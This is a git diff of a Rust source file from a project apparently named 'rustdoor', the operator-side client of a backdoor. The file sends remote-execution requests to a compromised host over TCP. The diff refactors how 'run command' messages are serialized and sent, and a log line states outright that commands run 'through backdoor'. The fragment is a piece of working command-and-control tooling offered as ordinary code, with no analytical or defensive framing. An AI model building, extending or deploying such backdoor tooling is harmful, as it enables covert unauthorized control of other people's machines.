@@ -1,30 +1,23 @@
 use byteorder::{BigEndian, WriteBytesExt};
-use rustdoor::communication::messages::{MessageType, RunCommandRequest, MESSAGE_HEADER_LENGTH};
+use rustdoor::communication::messages::{
+    MessageType, MessageTypes, RunCommandRequest, MESSAGE_HEADER_LENGTH,
+};
 use std::io::{Error, Write};
 use std::net::TcpStream;
 
 use crate::commanding::get_response;
-
-fn make_run_command_request_buffer(command: String, async_run: bool) -> Vec<u8> {
-    let req = RunCommandRequest { command, async_run };
-    let serialized_message = ron::ser::to_string(&req).unwrap();
-
-    let message_type = MessageType::RunCommandType as u8;
-    let message_len = serialized_message.len();
-
-    let mut buffer: Vec<u8> = Vec::with_capacity(message_len + MESSAGE_HEADER_LENGTH);
-    buffer.push(message_type);
-    buffer.write_u32::<BigEndian>(message_len as u32).unwrap();
-    buffer.extend(serialized_message.into_bytes());
-    buffer
-}
+use rustdoor::communication::serialization::serialize_message;
 
 pub fn run_command(command: String, mut stream: &mut TcpStream) -> Result<(), Error> {
     println!("Running command {} through backdoor.", command);
-    let msg = make_run_command_request_buffer(command, false);
+    let req = RunCommandRequest {
+        command,
+        async_run: false,
+    };
+    let msg = serialize_message(req).unwrap();
 
     println!("Sending buffer {:?}", msg);
-    stream.write(&msg).unwrap();
+    stream.write_all(&msg).unwrap();
     println!("Sent message, awaiting reply...");
 
     let response = get_response(&mut stream);
